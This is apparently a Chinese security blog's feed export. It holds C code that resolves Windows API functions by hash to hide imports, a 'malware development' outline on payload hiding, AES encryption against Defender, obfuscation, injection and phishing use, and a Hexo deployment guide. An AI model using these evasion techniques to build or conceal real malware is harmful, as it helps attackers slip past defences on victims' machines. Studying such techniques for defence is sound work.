https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlallocateheap</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI* fnRtlAllocateHeap)</span><span class="params">(PVOID HeapHandle, ULONG Flags, SIZE_T Size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* fnGetProcessHeap)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/console/getstdhandle</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* fnGetStdHandle)</span><span class="params">(DWORD nStdHandle)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/console/writeconsole</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* fnWriteConsoleA)</span><span class="params">(HANDLE  hConsoleOutput, <span class="type">const</span> VOID* lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID  lpReserved)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* fnGetProcessHeap)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-wsprintfw</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WINAPIV* fnwsprintfA)</span><span class="params">(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...)</span>;</span><br></pre></td></tr></table></figure><p><strong>main.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_NUM 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC_NUM 8</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showHash</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">char</span>* dllList[DLL_NUM] = &#123;</span><br><span class="line"><span class="string">&quot;NTDLL.DLL&quot;</span>,</span><br><span class="line"><span class="string">&quot;USER32.DLL&quot;</span>,</span><br><span class="line"><span class="string">&quot;KERNEL32.DLL&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span>* funcList[FUNC_NUM] = &#123;</span><br><span class="line"><span class="string">&quot;LoadLibraryA&quot;</span>,</span><br><span class="line"><span class="string">&quot;wsprintfA&quot;</span>,</span><br><span class="line"><span class="string">&quot;HeapFree&quot;</span>,</span><br><span class="line"><span class="string">&quot;HeapAlloc&quot;</span>,</span><br><span class="line"><span class="string">&quot;RtlAllocateHeap&quot;</span>,</span><br><span class="line"><span class="string">&quot;GetStdHandle&quot;</span>,</span><br><span class="line"><span class="string">&quot;WriteConsoleA&quot;</span>,</span><br><span class="line"><span class="string">&quot;GetProcessHeap&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span>* funcSysList[] = &#123;</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;// DLL Name Hash\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; DLL_NUM; i++) &#123;</span><br><span class="line"><span class="type">char</span> temp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#define HASH_&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; dllList[i][j] != <span class="string">&#x27;.&#x27;</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, dllList[i][j]);</span><br><span class="line"><span class="keyword">if</span> (j + <span class="number">5</span> &lt; <span class="number">8</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t0x%0.8X \n&quot;</span>, HASHA(dllList[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;// WIN API Name Hash\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; FUNC_NUM; i++) &#123;</span><br><span class="line"><span class="type">char</span> temp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#define Hash_%s&quot;</span>, funcList[i]);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; funcList[i][j] != <span class="string">&#x27;\x00&#x27;</span>; j++);</span><br><span class="line"><span class="keyword">if</span> (j + <span class="number">5</span> &lt; <span class="number">8</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (j + <span class="number">5</span> &lt; <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (j + <span class="number">5</span> &lt; <span class="number">24</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%0.8X \n&quot;</span>, HASHA(funcList[i]));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">HMODULE hModule_Kernel32 = Yes_GetModuleHandle_FromHash(HASH_KERNEL32);</span><br><span class="line"><span class="keyword">if</span> (hModule_Kernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] K32_DLL Get Fail. \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Get DLL KERNEL32\t: 0x%p \n+------------------------------------------+\n&quot;</span>, hModule_Kernel32);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] LLA func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_LoadLibraryA));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] HFr func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_HeapFree));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] HAl func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_HeapAlloc));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] GSH func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_GetStdHandle));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] WCA func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_WriteConsoleA));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] GPH func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_GetProcessHeap));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hModule_User32 = Yes_GetModuleHandle_FromHash(HASH_KERNEL32);</span><br><span class="line"><span class="keyword">if</span> (hModule_User32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] U32_DLL Get Fail.\n[+] Try Load U32_DLL.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> User32_dll[] = &#123; <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span> &#125;;</span><br><span class="line">hModule_User32 = (fnLoadLibraryA)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_LoadLibraryA)(User32_dll);</span><br><span class="line"><span class="keyword">if</span> (hModule_User32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] U32_DLL Load Fail. \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Load DLL USER32\t: 0x%p \n+------------------------------------------+\n&quot;</span>, hModule_User32);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Get DLL USER32\t: 0x%p \n+------------------------------------------+\n&quot;</span>, hModule_User32);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] wpf func address\t: 0x%p \n&quot;</span>, Yes_GetProcAddress_FromHash(hModule_User32, Hash_wsprintfA));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;+------------------------------------------+\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">fnLoadLibraryA pLoadLibraryA;</span><br><span class="line">fnHeapFree pHeapFree;</span><br><span class="line">fnHeapAlloc pHeapAlloc;</span><br><span class="line">fnGetStdHandle pGetStdHandle;</span><br><span class="line">fnWriteConsoleA pWriteConsoleA;</span><br><span class="line">fnGetProcessHeap pGetProcessHeap;</span><br><span class="line">fnwsprintfA pwsprintfA;</span><br><span class="line">fnRtlAllocateHeap pRtlAllocateHeap;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">api_init</span><span class="params">()</span> &#123;</span><br><span class="line">HMODULE hModule_Kernel32 = Yes_GetModuleHandle_FromHash(HASH_KERNEL32);</span><br><span class="line"><span class="keyword">if</span> (hModule_Kernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pLoadLibraryA = (fnLoadLibraryA)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_LoadLibraryA);</span><br><span class="line">pHeapFree = (fnHeapFree)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_HeapFree);</span><br><span class="line">pHeapAlloc = (fnHeapAlloc)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_HeapAlloc);</span><br><span class="line">pGetStdHandle = (fnGetStdHandle)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_GetStdHandle);</span><br><span class="line">pWriteConsoleA = (fnWriteConsoleA)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_WriteConsoleA);</span><br><span class="line">pGetProcessHeap = (fnGetProcessHeap)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_GetProcessHeap);</span><br><span class="line"></span><br><span class="line">HMODULE hModule_User32 = Yes_GetModuleHandle_FromHash(HASH_USER32);</span><br><span class="line"><span class="keyword">if</span> (hModule_User32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> User32_dll[] = &#123; <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span> &#125;;</span><br><span class="line">hModule_User32 = pLoadLibraryA(User32_dll);</span><br><span class="line"><span class="keyword">if</span> (hModule_User32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwsprintfA = (fnwsprintfA)Yes_GetProcAddress_FromHash(hModule_User32, Hash_wsprintfA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE hModule_NtDll = Yes_GetModuleHandle_FromHash(HASH_NTDLL);</span><br><span class="line"><span class="keyword">if</span> (hModule_NtDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> NtDll_dll[] = &#123; <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span> &#125;;</span><br><span class="line">hModule_NtDll = pLoadLibraryA(NtDll_dll);</span><br><span class="line"><span class="keyword">if</span> (hModule_NtDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pRtlAllocateHeap = (fnwsprintfA)Yes_GetProcAddress_FromHash(hModule_NtDll, Hash_RtlAllocateHeap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">showHash();</span><br><span class="line">test();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line">api_init();</span><br><span class="line">PRINTA(<span class="string">&quot;[+] pLLA Func Addr: 0x%p \n&quot;</span>, pLoadLibraryA);</span><br><span class="line">PRINTA(<span class="string">&quot;[+] pRAH Func Addr: 0x%p \n&quot;</span>, pRtlAllocateHeap);</span><br><span class="line"><span class="comment">//getchar();</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Good Luck.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;ITA(Import Table Address) 包含有关 PE 文件的信息，例如使用的函数名以及 DLL，此类信息常用于对二进制文件进行</summary>
      
    
    
    
    
    <category term="Maldev" scheme="http://fermionorz.github.io/tags/Maldev/"/>
    
  </entry>
  
  <entry>
    <title>Windows 恶意软件开发</title>
    <link href="http://fermionorz.github.io/2024/10/08/Windows%20%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    <id>http://fermionorz.github.io/2024/10/08/Windows%20%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/</id>
    <published>2024-10-08T07:24:00.000Z</published>
    <updated>2024-11-18T12:30:51.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows 下的恶意软件一般包含以下功能</p><ul><li><input disabled="" type="checkbox"> Payload 存储、加密、混淆、执行</li><li><input disabled="" type="checkbox"> PE 信息伪造、进程信息伪造</li><li><input disabled="" type="checkbox"> 沙箱检测、虚拟环境检测</li><li><input disabled="" type="checkbox"> 反调试、杀软绕过</li><li><input disabled="" type="checkbox"> EDR 绕过</li></ul><h2 id="Payload-存储"><a href="#Payload-存储" class="headerlink" title="Payload 存储"></a>Payload 存储</h2><p>目前有以下存储方式</p><ul><li>PE 文件内部<ul><li>.data .rdata 段</li><li>.text 段</li><li>.rsrc 段</li></ul></li><li>本地 Payload 分离<ul><li>可以起一个伪装的名称，config.xml、resources.pak…</li></ul></li><li>远程 Payload<ul><li><a href="https://xxx.com/favicon.ico">https://xxx.com/favicon.ico</a></li><li><a href="http://xxx.com/uploads/images/head.png">http://xxx.com/uploads/images/head.png</a></li></ul></li><li>Windows 注册表</li></ul><p>三种方法各有优劣，应根据实际应用场景进行选择。例如：</p><ul><li>在权限维持场景中，可以优先考虑 Payload 分离；</li><li>在社工钓鱼的场景中，可以优先考虑远程文件的方式，这样可以在钓鱼行动被发现后更改远程 Payload 内容；</li><li>在多层内网环境或者存在离线环境的情况下，就优先考虑在 PE 文件内部存储 Payload，这样会让蓝队不那么容易去追踪感染链。</li></ul><h3 id="PE-文件内部存储"><a href="#PE-文件内部存储" class="headerlink" title="PE 文件内部存储"></a>PE 文件内部存储</h3><ul><li><input disabled="" type="checkbox"> .data 段主要包含初始化的全局和静态变量，可读可写；.rdata 段存放常量，只读。一个较小的程序需要初始化一个较大的变量，这种行为看起来多少会有些奇怪。</li><li><input disabled="" type="checkbox"> .text 段具有可执行权限，存储在其中的数据可以直接执行，因此这个段需要接受的审查会更严格，如果 Payload 较小（小于 10 字节），那么放在此段效果会很好。</li><li><input checked="" disabled="" type="checkbox"> .rsrc 段主要放置资源文件，实际情况下大部分的二进制文件都会在此存放数据，所以 Payload 可以未造成图标或者其他文件存储在这里。</li></ul><h3 id="Payload-分离"><a href="#Payload-分离" class="headerlink" title="Payload 分离"></a>Payload 分离</h3><p>Payload 分离，需要考虑的问题就是如何伪装，可以根据普通应用程序的内容来模仿。</p><ul><li>Windows 注册表</li><li>游戏资源文件</li><li>主题文件</li><li>chm 手册</li><li>pak、v8 文件（主要是一些基于浏览器打包的应用程序）</li><li>ui 文件</li><li>dll 文件</li></ul><h3 id="远程-Payload"><a href="#远程-Payload" class="headerlink" title="远程 Payload"></a>远程 Payload</h3><p>本质上也是对 Payload 进行分离，所以需要考虑的内容也是如何伪装</p><ul><li>图标资源</li><li>API 请求</li><li>…</li></ul><h2 id="Payload-加密"><a href="#Payload-加密" class="headerlink" title="Payload 加密"></a>Payload 加密</h2><ul><li><input disabled="" type="checkbox"> XOR</li><li><input disabled="" type="checkbox"> RC4</li><li><input checked="" disabled="" type="checkbox"> AES</li></ul><p>XOR、RC4 加密已经无法绕过 Windows Defender 了，建议使用 AES 或者其他强加密方法。</p><h2 id="Payload-混淆"><a href="#Payload-混淆" class="headerlink" title="Payload 混淆"></a>Payload 混淆</h2><ul><li><input checked="" disabled="" type="checkbox"> IPv4&#x2F;IPv6</li><li><input checked="" disabled="" type="checkbox"> MAC</li><li><input checked="" disabled="" type="checkbox"> UUID</li></ul><p>三种方法可以结合应用场景进行选择。例如：Payload 分离的存储方式可以搭配 MAC 混淆，将 Payload 存储在 xml 等文件中。</p><h2 id="Payload-执行"><a href="#Payload-执行" class="headerlink" title="Payload 执行"></a>Payload 执行</h2><ul><li><input disabled="" type="checkbox"> 本地&#x2F;远程 DLL 加载</li><li><input disabled="" type="checkbox"> 本地&#x2F;远程进程执行</li><li><input disabled="" type="checkbox"> 本地&#x2F;远程线程创建</li><li><input disabled="" type="checkbox"> 本地&#x2F;远程线程劫持</li><li><input disabled="" type="checkbox"> APC 注入</li><li><input disabled="" type="checkbox"> 回调代码执行</li><li><input disabled="" type="checkbox"> 本地&#x2F;远程映射注入</li><li><input disabled="" type="checkbox"> 本地&#x2F;远程函数篡改</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Windows 下的恶意软件一般包含以下功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;</summary>
      
    
    
    
    
    <category term="Security" scheme="http://fermionorz.github.io/tags/Security/"/>
    
    <category term="Windows" scheme="http://fermionorz.github.io/tags/Windows/"/>
    
    <category term="C" scheme="http://fermionorz.github.io/tags/C/"/>
    
    <category term="恶意软件" scheme="http://fermionorz.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Blog 解决方案</title>
    <link href="http://fermionorz.github.io/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://fermionorz.github.io/2024/09/29/Blog%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2024-09-29T07:24:00.000Z</published>
    <updated>2024-11-18T12:30:51.163Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>目前的解决方案：Hexo &amp; cactus + Github Action</p></blockquote><h2 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h2><p>Blog 采用 Hexo 引擎 cactus 主题，并对主题做了些微改动</p><h3 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h3><blockquote><p>我这里使用的是 Node.js 18.x 版本</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">npm install hexo-cli -g</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line"><span class="comment"># 创建私有 github 仓库 https://github.com/[youname]/blog.git</span></span><br><span class="line"><span class="comment"># 想知道如何 clone/push/pull 私有仓库，去网上搜搜吧</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[your_name]/blog.git</span><br><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line"><span class="comment"># 初始化 blog</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment"># 安装主题</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/probberechts/hexo-theme-cactus.git themes/cactus</span><br></pre></td></tr></table></figure><ul><li>编辑 blog&#x2F;_config.yml</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">&#x27;标题&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;站点简介&#x27;</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">&#x27;作者名称&#x27;</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="comment"># 我这里使用的是 github pages 的一个子目录</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">&#x27;https://[your_name].github.io/&#x27;</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">cactus</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment"># 其他可以保持默认</span></span><br></pre></td></tr></table></figure><ul><li>编辑 <code>blog/theme/cactus/_config.yml</code>，配置内容参考作者提供的文档即可</li></ul><blockquote><p><a href="https://github.com/probberechts/hexo-theme-cactus">https://github.com/probberechts/hexo-theme-cactus</a></p></blockquote><h3 id="Github-Action-自动化发布"><a href="#Github-Action-自动化发布" class="headerlink" title="Github Action 自动化发布"></a>Github Action 自动化发布</h3><ul><li>编辑 .github&#x2F;workflows&#x2F;hexo.yml</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">hexo-ci</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">contents:</span> <span class="string">write</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v4</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">使用</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span 